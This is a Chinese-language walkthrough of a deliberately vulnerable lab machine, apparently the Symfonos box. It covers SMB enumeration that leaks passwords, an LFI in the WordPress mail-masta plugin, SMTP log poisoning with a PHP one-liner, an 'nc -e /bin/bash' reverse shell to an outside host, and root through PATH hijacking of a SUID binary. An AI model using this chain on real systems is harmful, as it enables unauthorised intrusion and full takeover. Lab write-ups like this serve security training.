靶机目标


获得root shell


使用工具


kali，nmap，dirb，metasploit、wpscan


操作过程


1.首先扫描同网段下其余存活主机，我将靶机的网络模式改成nat模式，共享主机的ip，让靶机和主机在同一网段下，发现目标主机192.168.206.149:

arp-scan 192.168.206.1/24

2.扫描目标的端口及服务:

 nmap -sV -p- 192.168.206.153

3.首先访问80端口

4.就是一张图片，什么也没有。使用dirb扫描一下目录，除了index.html什么也没扫出来。

5.从上面的端口来看，靶机上还开放着SMB服务。

SMB（服务器消息块）是一种协议，它允许同一网络上的资源共享文件，浏览网络并通过网络进行打印。它最初用于Windows，但是Unix系统可以通过Samba使用SMB。通常，服务器上有SMB共享驱动器，可以连接到该驱动器并用于查看或传输文件。对于想要发现敏感信息的攻击者来说，SMB通常可以是一个很好的起点–您会惊讶地发现这些共享中有时包含什么。在极少数情况下，例如当SMB共享目录和Web服务器根目录相同时，攻击者甚至可能利用这种错误配置来实现代码执行。

SMB可以使用Enum4linux和Smbclient枚举。下面使用Smbclient进行枚举， 命令：smbclient -L 192.168.206.153

查看一下helios目录，命令：smbclient //192.168.206.153/helios

需要账号密码 再看一下anoymous目录，命令：smbclient //192.168.206.153/anonymous

这个不需要密码，直接进去了，下面有一个txt文件，下载下来看一下

大概意思是：

请用户停止使用“epidioko”、“qwerty”和“baseball”等密码!下一个使用这些密码的人将被解雇!-宙斯

哈哈，看得出来靶机作者很喜欢古希腊神话。拿到了三个密码，那就去helios目录试试，用户名就先用helios，命令：smbclient //192.168.206.153/helios -U helios，进去了，密码：helios \ qwerty 在helios下发现两个txt文件，都下载下来看看。

research.txt里面是一个关于太阳神的希腊故事，todo.txt里面提供了一个目录 尝试使用web访问，发现是个wordpress的网站，网站打开非常慢。。。

点击后，发现会解析到http://symfonos.local/h3l105/中，需要host里添加该网站，就可以正常打开了

既然是wordpress CMS，那就用wpscan扫描一下，这里吐槽一下wpscan，经常出现一些莫名其妙的bug，也可能使我菜逼不会配置。命令：wpscan --url http://192.168.206.153/h3l105/ --plugins-detection aggressive

发现这两插件都存在文件包含，验证后确定存在

﻿http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

回顾端口扫描,25端口开启有smtp服务,可以往25端口发邮件写入反弹shell命令，再通过访问邮件日志触发命令，对于常见日志目录如Apache:/var/log/apache2/access.log  ssh: /var/log/auth.log 熟悉更好

邮件日志文件目录：/var/mail 每个用户文件在各自用户目录下 如www-data : /var/mail/www-data, 用户helios邮件日志如下

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios

﻿下面开始写邮件写入一句话

﻿注意点：键入每个命令之后按1个 Enter 键，data之后输入一句话后要连按2个Enter 键，之后输入英文"." 表示发送数据结束，可以看到邮件写入成功

﻿执行id 验证下

﻿然后执行反弹shell命令 nc -e /bin/bash 192.168.206.151 1234 本地开启监听 nc -lvp 1234,成功反弹

﻿查找suid权限文件

find / -perm -u=s -type f 2>/dev/null

﻿注意下文件 /opt/statuscheck 通过strings命令查看内容，发现调用了curl命令

附：strings命令输出的字符串长度为4个或4个以上的，长度小于4的字符串将不予打印，我们可以通过-n参数调整，strings -n 2 filename

strings /opt/statuscheck

﻿下面通过PATH变量提权，成功。有一点有点奇怪这儿的shell环境只能用/bin/sh, 用/bin/bash不能成功反弹

cd /tmp

echo "/bin/sh" > curl

chmod 777 curl

export PATH=/tmp:$PATH

echo $PATH

/opt/statuscheck

思路总结


首先使用arp-scan扫描目标IP，然后使用nmap扫描目标端口，发现80端口，网页内容是wordpress，然后利用wpscan扫描发现漏洞，使用smtp服务写入目标一句话木马，然后利用木马反弹shell，然后利用string命令修改path变量进行提权，最后拿到root权限。
